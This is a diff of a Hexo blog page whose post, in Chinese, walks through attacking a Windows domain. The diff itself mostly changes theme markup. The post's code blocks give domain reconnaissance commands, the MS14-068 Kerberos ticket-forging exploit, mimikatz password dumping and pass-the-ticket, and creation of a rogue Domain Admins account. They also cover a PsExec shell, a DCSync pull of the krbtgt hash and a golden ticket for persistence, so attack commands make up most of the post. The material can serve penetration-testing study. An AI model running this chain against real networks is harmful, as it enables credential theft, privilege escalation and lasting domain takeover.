@@ -197,6 +197,26 @@
         </li>
       
         
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
         <li class="menu-item menu-item-archives">
           <a href="/archives/" rel="section">
             
@@ -400,7 +420,7 @@
 <p><a href="https://imgchr.com/i/PjvNKH" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/31/PjvNKH.md.png" alt="PjvNKH.md.png"></a></p>
 <p>上面是标准Kerberos协议的基本流程，MIT也实现了一套标准的Kerberos协议，而微软在Windows平台上的Kerberos并没有采用MIT的实现，而是对Kerberos协议进行了一些扩充，其中最重要的扩充就是增加了认证过程中的权限认证，也就是在协议中增加了PAC（PrivilegeAttribute Certificate），特权属性证书。</p>
 <h2 id="0X03-信息收集"><a href="#0X03-信息收集" class="headerlink" title="0X03 信息收集"></a>0X03 信息收集</h2><ul>
-<li>常用命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ipconfig /all                            ------ 查询本机IP段，所在域等</span><br><span class="line">net user                                 ------ 本机用户列表</span><br><span class="line">net localgroup administrators            ------ 本机管理员[通常含有域用户]</span><br><span class="line">net user /domain                         ------ 查询域用户</span><br><span class="line">net group /domain                        ------ 查询域里面的工作组</span><br><span class="line">net group &quot;domain admins&quot; /domain        ------ 查询域管理员用户组</span><br><span class="line">net localgroup administrators /domain    ------ 登录本机的域管理员</span><br><span class="line">net localgroup administrators workgroup\user001 /add   ------域用户添加到本机</span><br><span class="line">net group &quot;domain controllers&quot; /domain                 ------ 查看域控制器(如果有多台)</span><br><span class="line">net time /domain                  ------ 判断主域，主域服务器都做时间服务器</span><br><span class="line">net config workstation            ------ 当前登录域</span><br><span class="line">net session                       ------ 查看当前会话</span><br><span class="line">net use \\ip\ipc$ pawword /user:username      ------ 建立IPC会话</span><br><span class="line">net share                          ------  查看SMB指向的路径[即共享]</span><br><span class="line">net view                           ------ 查询同一域内机器列表</span><br><span class="line">net view \\ip                      ------ 查询某IP共享</span><br><span class="line">net view /domain                   ------ 查询域列表</span><br><span class="line">net view /domain:domainname        ------ 查看workgroup域中计算机列表</span><br><span class="line">net start                          ------ 查看当前运行的服务</span><br><span class="line">net accounts                       ------  查看本地密码策略</span><br><span class="line">net accounts /domain               ------  查看域密码策略</span><br><span class="line">nbtstat –A ip                     ------netbios 查询</span><br><span class="line">netstat –an/ano/anb               ------ 网络连接查询</span><br><span class="line">route print                        ------ 路由表</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tasklist /V                                         ----- 查看进程[显示对应用户]</span><br><span class="line">tasklist /S ip /U domain\username /P /V             ----- 查看远程计算机进程列表</span><br><span class="line">qprocess *                                          ----- 类似tasklist</span><br><span class="line">qprocess /SERVER:IP                                 ----- 远程查看计算机进程列表</span><br><span class="line">nslookup –qt-MX Yahoo.com                          ----- 查看邮件服务器</span><br><span class="line">whoami /all                                         ----- 查询当前用户权限等</span><br><span class="line">set                                                 ----- 查看系统环境变量</span><br><span class="line">systeminfo                                          ----- 查看系统信息</span><br><span class="line">qwinsta                                             ----- 查看登录情况</span><br><span class="line">qwinsta /SERVER:IP                                  ----- 查看远程登录情况</span><br><span class="line">fsutil fsinfo drives                                ----- 查看所有盘符</span><br><span class="line">gpupdate /force                                     ----- 更新域策略</span><br></pre></td></tr></table></figure>
+<li>常用命令<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ipconfig /all                            ------ 查询本机IP段，所在域等</span><br><span class="line">net<span class="built_in"> user </span>                                ------ 本机用户列表</span><br><span class="line">net localgroup administrators            ------ 本机管理员[通常含有域用户]</span><br><span class="line">net<span class="built_in"> user </span>/domain                         ------ 查询域用户</span><br><span class="line">net<span class="built_in"> group </span>/domain                        ------ 查询域里面的工作组</span><br><span class="line">net<span class="built_in"> group </span><span class="string">"domain admins"</span> /domain        ------ 查询域管理员用户组</span><br><span class="line">net localgroup administrators /domain    ------ 登录本机的域管理员</span><br><span class="line">net localgroup administrators workgroup\user001 /<span class="builtin-name">add</span>   ------域用户添加到本机</span><br><span class="line">net<span class="built_in"> group </span><span class="string">"domain controllers"</span> /domain                 ------ 查看域控制器(如果有多台)</span><br><span class="line">net time /domain                  ------ 判断主域，主域服务器都做时间服务器</span><br><span class="line">net<span class="built_in"> config </span>workstation            ------ 当前登录域</span><br><span class="line">net session                       ------ 查看当前会话</span><br><span class="line">net use \\ip\ipc$ pawword /user:username      ------ 建立IPC会话</span><br><span class="line">net share                          ------  查看SMB指向的路径[即共享]</span><br><span class="line">net view                           ------ 查询同一域内机器列表</span><br><span class="line">net view \\ip                      ------ 查询某IP共享</span><br><span class="line">net view /domain                   ------ 查询域列表</span><br><span class="line">net view /domain:domainname        ------ 查看workgroup域中计算机列表</span><br><span class="line">net start                          ------ 查看当前运行的服务</span><br><span class="line">net accounts                       ------  查看本地密码策略</span><br><span class="line">net accounts /domain               ------  查看域密码策略</span><br><span class="line">nbtstat –A<span class="built_in"> ip </span>                    ------netbios 查询</span><br><span class="line">netstat –an/ano/anb               ------ 网络连接查询</span><br><span class="line">route <span class="builtin-name">print</span>                        ------ 路由表</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tasklist /V                                         ----- 查看进程[显示对应用户]</span><br><span class="line">tasklist /S<span class="built_in"> ip </span>/U domain\username /P /V             ----- 查看远程计算机进程列表</span><br><span class="line">qprocess *                                          ----- 类似tasklist</span><br><span class="line">qprocess /SERVER:IP                                 ----- 远程查看计算机进程列表</span><br><span class="line">nslookup –qt-MX Yahoo.com                          ----- 查看邮件服务器</span><br><span class="line">whoami /all                                         ----- 查询当前用户权限等</span><br><span class="line"><span class="builtin-name">set</span>                                                 ----- 查看系统环境变量</span><br><span class="line">systeminfo                                          ----- 查看系统信息</span><br><span class="line">qwinsta                                             ----- 查看登录情况</span><br><span class="line">qwinsta /SERVER:IP                                  ----- 查看远程登录情况</span><br><span class="line">fsutil fsinfo drives                                ----- 查看所有盘符</span><br><span class="line">gpupdate /force                                     ----- 更新域策略</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
 <h2 id="0x04-获取域管理员权限：MS14-068"><a href="#0x04-获取域管理员权限：MS14-068" class="headerlink" title="0x04 获取域管理员权限：MS14-068"></a>0x04 获取域管理员权限：MS14-068</h2><p>ms14-068漏洞在域控没有打补丁（kb3011780）时，能将任意域用户，提升为域管理员权限。</p>
@@ -408,21 +428,21 @@
 <ul>
 <li>神器mimikatz </li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
 <ul>
-<li>ms14068.exe  伪造kerberos票据<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain controllers&quot;  /domain   获取计算机名称</span><br></pre></td></tr></table></figure>
+<li>ms14068.exe  伪造kerberos票据<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net<span class="built_in"> group </span><span class="string">"domain controllers"</span>  /domain   获取计算机名称</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ms14-068.exe -u test@domaintest.com -p 123456 -s S-1-5-21-1607545464-3564583392-2085136103-1114</span><br><span class="line">-d WIN-0IQJV7P073G.domaintest.com</span><br></pre></td></tr></table></figure>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ms14<span class="number">-068.</span>exe -u test@domaintest.com -p <span class="number">123456</span> -s S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-1607545464</span><span class="number">-3564583392</span><span class="number">-2085136103</span><span class="number">-1114</span></span><br><span class="line">-d WIN<span class="number">-0</span>IQJV7P073G.domaintest.com</span><br></pre></td></tr></table></figure>
 <ul>
 <li>mimikatz 导入票据</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptc TGT_test@domaintest.com.ccache&quot; exit</span><br></pre></td></tr></table></figure>
-<p>拿到域管理权限便可进行其他一系列操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dir \\WIN-0IQJV7P073G.domaintest.com\c$    注意这里应为域控主机名称，不能为ip</span><br><span class="line"></span><br><span class="line">net user admin xxxxx@password /add /domain</span><br><span class="line">net group &quot;Domain Admins&quot; admin /add /domain</span><br><span class="line"></span><br><span class="line">PsExec.exe \\192.168.111.129 cmd.exe</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">"kerberos::ptc TGT_test@domaintest.com.ccache"</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
+<p>拿到域管理权限便可进行其他一系列操作<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dir \\WIN-0IQJV7P073G.domaintest.com\c$    注意这里应为域控主机名称，不能为ip</span><br><span class="line"></span><br><span class="line">net<span class="built_in"> user </span>admin xxxxx@password /<span class="builtin-name">add</span> /domain</span><br><span class="line">net<span class="built_in"> group </span><span class="string">"Domain Admins"</span> admin /<span class="builtin-name">add</span> /domain</span><br><span class="line"></span><br><span class="line">PsExec.exe \\192.168.111.129 cmd.exe</span><br></pre></td></tr></table></figure></p>
 <h2 id="0x05-权限维持：黄金票据"><a href="#0x05-权限维持：黄金票据" class="headerlink" title="0x05 权限维持：黄金票据"></a>0x05 权限维持：黄金票据</h2><p>原理<br>每个用户的Ticket都是由krbtgt的密码Hash来生成的，那么，我们如果拿到了krbtgt的密码Hash，不就可以随意伪造Ticket了吗？</p>
 <p>实际上只要拿到了域控权限，在上面就可以很容易的获得krbtgt的Hash值，再通过mimikatz即可生成任意用户任何权限的Ticket，也就是Golden Ticket</p>
-<p>获取krbtgt<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz log &quot;lsadump::dcsync /domaintest.com /user:krbtgt&quot;</span><br></pre></td></tr></table></figure></p>
-<p>构造黄金票据并注入内存<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::purge</span><br><span class="line">mimikatz # kerberos::golden /admin:Administrator /domain:domaintest.com /sid:S-1-5-21-3883552807-251258116-2724407435 /krbtgt:6a8e501fabcf264c70ef3316c6aab7dc /ticket:Administrator.kiribi</span><br><span class="line">mimikatz # kerberos::ptt Administrator.kiribi</span><br><span class="line">mimikatz # kerberos::tgt</span><br></pre></td></tr></table></figure></p>
+<p>获取krbtgt<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="built_in">log</span> <span class="string">"lsadump::dcsync /domaintest.com /user:krbtgt"</span></span><br></pre></td></tr></table></figure></p>
+<p>构造黄金票据并注入内存<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">mimikatz</span> # <span class="selector-tag">kerberos</span><span class="selector-pseudo">::purge</span></span><br><span class="line"><span class="selector-tag">mimikatz</span> # <span class="selector-tag">kerberos</span><span class="selector-pseudo">::golden</span> /<span class="selector-tag">admin</span><span class="selector-pseudo">:Administrator</span> /<span class="selector-tag">domain</span><span class="selector-pseudo">:domaintest.com</span> /<span class="selector-tag">sid</span><span class="selector-pseudo">:S-1-5-21-3883552807-251258116-2724407435</span> /<span class="selector-tag">krbtgt</span><span class="selector-pseudo">:6a8e501fabcf264c70ef3316c6aab7dc</span> /<span class="selector-tag">ticket</span><span class="selector-pseudo">:Administrator.kiribi</span></span><br><span class="line"><span class="selector-tag">mimikatz</span> # <span class="selector-tag">kerberos</span><span class="selector-pseudo">::ptt</span> <span class="selector-tag">Administrator</span><span class="selector-class">.kiribi</span></span><br><span class="line"><span class="selector-tag">mimikatz</span> # <span class="selector-tag">kerberos</span><span class="selector-pseudo">::tgt</span></span><br></pre></td></tr></table></figure></p>
 <p>当然除了golden ticket，silver ticket之外还有kerberos ticket，历史SID，AdminSDHolder，DSRM，GPP，DCSync等技术手段都可以用来当做域控的隐藏后门。</p>
 <p>  参考文章<br>  <a href="http://drops.xmd5.com/static/drops/tips-12159.html" target="_blank" rel="noopener">域渗透——Pass The Ticket</a><br>  <a href="https://github.com/l3m0n/pentest_study" target="_blank" rel="noopener">l3m0n:从零开始内网渗透学习</a><br>  <a href="https://paper.tuisec.win/detail/2a7446285e7d085" target="_blank" rel="noopener">初级域渗透系列 - 01. 基本介绍&amp;信息获取</a><br>  <a href="https://paper.tuisec.win/detail/fc1086dabbc9002" target="_blank" rel="noopener">初级域渗透系列 - 02. 常见攻击方法 - 1</a><br>  <a href="https://paper.tuisec.win/detail/cd49c17ca23cece" target="_blank" rel="noopener">初级域渗透系列 - 03. 常见攻击方法</a></p>
 
@@ -442,7 +462,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/域渗透/" rel="tag"># 域渗透</a>
+            <a href="/tags/域渗透/" rel="tag"><i class="fa fa-tag"></i> 域渗透</a>
           
         </div>
       
@@ -544,7 +564,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">35</span>
+                  <span class="site-state-item-count">36</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -554,10 +574,10 @@
               
               
               <div class="site-state-item site-state-categories">
-                
+                <a href="/categories/index.html">
                   <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">categories</span>
-                
+                </a>
               </div>
             
 
@@ -565,10 +585,10 @@
               
               
               <div class="site-state-item site-state-tags">
-                
-                  <span class="site-state-item-count">13</span>
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">14</span>
                   <span class="site-state-item-name">tags</span>
-                
+                </a>
               </div>
             
 
@@ -619,7 +639,8 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
@@ -629,6 +650,11 @@
 </div>
 
 
+  <div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
   <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
 
 
